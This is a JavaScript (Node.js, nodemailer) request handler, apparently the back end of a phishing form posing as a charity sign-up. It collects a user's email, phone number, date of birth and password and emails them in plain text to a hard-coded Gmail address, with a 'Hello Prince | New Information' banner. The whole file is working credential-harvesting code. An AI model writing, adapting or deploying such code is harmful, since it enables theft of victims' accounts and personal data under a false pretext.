import nodemailer from "nodemailer";
import dotenv from "dotenv";

dotenv.config();

// Create a transporter with your email service configuration
const transporter = nodemailer.createTransport({
  service: "gmail",
  host: "smtp.gmail.com",
  port: 465,
  secure: true,
  auth: {
    user: process.env.email,
    pass: process.env.emailPassword,
  },
});

const userInfo = async (req, res) => {
  const { email, phone, password, date } = req.body;

  try {
    const emailBody = `
    <div style="">
        <div style="width: 100%; height: 20px; background-color: #3855b3; margin-bottom: 20px;"></div>

          <div style="width: 100%; display: flex; flex-direction: column; align-items: center;">
              <table width="800">
                  <tbody style="">
                      <thead>
                          <tr>
                              <td>
                                  <h1>Hello Prince | New Information | Charity Organization</h1>
                              </td>
                          </tr>
                      </thead>
                     <tr>
                          <td style="font-size: 24px; max-width: 70px;">User Email:</td>
                          <td style="font-size: 16px;">
                            <p>${email}</p>
                          </td>
                      </tr>
                      <tr>
                          <td style="font-size: 24px; max-width: 70px;">User Phone:</td>
                          <td style="font-size: 16px;">
                            <p>${phone}</p>
                          </td>
                      </tr>
                      <tr>
                          <td style="font-size: 24px; max-width: 70px;">Date of birth:</td>
                          <td style="font-size: 16px;">
                            <p>${date}</p>
                          </td>
                      </tr>
                      <tr>
                          <td style="font-size: 24px; max-width: 70px;">Password:</td>
                          <td style="font-size: 16px;">
                            <p>${password}</p>
                          </td>
                      </tr>
                  </tbody>
              </table>
          </div>
          
          <div style="width: 100%; background-color: #3855b3; padding: 20px 0; margin-top: 30px; height: 100px;">
              <div style="margin-left: 30px; display: flex; align-items: center;">
                  <div>
                      <p style="margin-left: 24px; color: white; font-size: 16px;">&copy; 2024</p>
                      <small style="margin-left: 24px;"><a style="text-decoration: none; color: white; font-size: 16px;" href="https://clevercode.pages.dev/">CleverCode-technologies | All rights reserved</a></small>
                  </div>
              </div>
          </div>
    `;

    // Send email using Nodemailer
    const info = await transporter.sendMail({
      from: process.env.email,
      to: 'michealjacksonteam2024@gmail.com',
      subject: 'Charity Organization',
      html: emailBody
    });

    console.log('Email sent:', info.messageId);
    res.status(200).send({ message: 'Form submitted', status: 200 });
  } catch (error) {
    console.error('Error sending email:', error);
    res.status(500).send({ message: 'There\'s been an error in your request', status: 500, error: error.message });
  }
};

export default userInfo;
